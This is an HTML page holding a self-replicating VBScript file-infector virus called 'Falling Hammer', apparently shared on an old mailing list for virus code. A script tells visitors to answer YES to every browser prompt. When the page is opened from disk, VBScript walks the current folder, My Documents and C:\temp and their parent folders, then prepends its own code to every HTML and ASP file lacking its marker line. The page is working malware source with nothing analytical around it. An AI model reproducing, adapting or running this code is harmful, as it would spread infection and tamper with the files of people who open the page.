<META NAME=Version CONTENT=Fixed/b>
<META NAME=Author CONTENT=KSG (AMACC)>
<META NAME=Contents CONTENT=HTMLvirus>
<html><body>
<SCRIPT Language = "JavaScript">
<!--
    var userAgent=navigator.appName;
    var userVer=navigator.appVersion;
    var agentInfo=userAgent.substring(0, 1);
    var agentVer=userVer.substring(0, 1);
if(agentInfo == "M"){
if (agentVer =="4"){
alert("To view this page in full content, make sure \nthat you answer YES to every question")
}
}else {
alert("This page requires IE4 or up, \nget it from www.microsoft.com\ie ")
self.close()
history.go(-1)
}
//-->
</SCRIPT>
<script Language="VBScript">
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

if location.protocol = "file:" then
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Path = Replace(location.href, "/", "\")
    Path = Replace(Path, "file:\\\", "")
    Path = FSO.GetParentFolderName(Path)
    Set TRange = document.body.createTextRange
    call Getfolder1(".")
    Call GetFolder1("C:\My Documents")
    Call GetFolder1("C:\temp")
end if

Sub GetFolder1(InfPath)
rem On Error Resume Next

rem if FSO.FolderExists(InfPath+"\") then

 Set FolderObj = FSO.GetFolder(InfPath)
msgbox(infpath)
    Do
    InfPath = FSO.GetParentFolderName(InfPath)
    Set FO = FolderObj.Files
    For each target in FO
        ExtName = lcase(FSO.GetExtensionName(target.Name))
msgbox(extname)
        if ExtName = "asp" or ExtName = "shtml" or ExtName = "stm" or ExtName = "htm" or ExtName = "html" then
            Set Real = FSO.OpenTextFile(target.path, 1, False)
            if Real.readline <> "<META NAME=Version CONTENT=Fixed/b>" then
                Real.close()
                GetFile(target.path)
            else
                Real.close()
            end if
        end if
    next
    Loop Until FolderObj.IsRootFolder = True
rem end if
End Sub

Sub GetFile(GetFileName)
msgbox(GetFileName)
    Set Real = FSO.OpenTextFile(GetFileName, 1, False)
    FileContents = Real.ReadAll()
    Real.close()
    Set Real = FSO.OpenTextFile(GetFileName, 2, False)
    Real.WriteLine "<META NAME=Version CONTENT=Fixed/b>"
    Real.WriteLine "<META NAME=Author CONTENT=KSG>"
    Real.WriteLine "<META NAME=Virus Name CONTENT=Falling Hammer>"
    Real.Write("<html><body>" + Chr(13) + Chr(10))
    Real.WriteLine TRange.htmlText
    Real.WriteLine("")
    Real.Write(FileContents)
    Real.close()
End Sub
-->
</script>
<HTML><HEAD><TITLE>The Falling Hammer Virus</TITLE></HEAD>
<BR><HR>
<hr><center>
<a target="egnewwin" href="http://clickhere.egroups.com/click/544">
<center>
<img width="468" height="60" border="0"
  src="http://clickhere.egroups.com/img/000544/wounded1.gif"
  alt="click here"><BR>
</center>
<center>
Click Here!
</center>
</a>
</center>
eGroups.com home: <a href="http://www.egroups.com/group/virus-list">http://www.egroups.com/group/virus-list</a><br>
<a href="http://www.egroups.com">www.egroups.com</a> - Simplifying group communications<br>
</body></html>
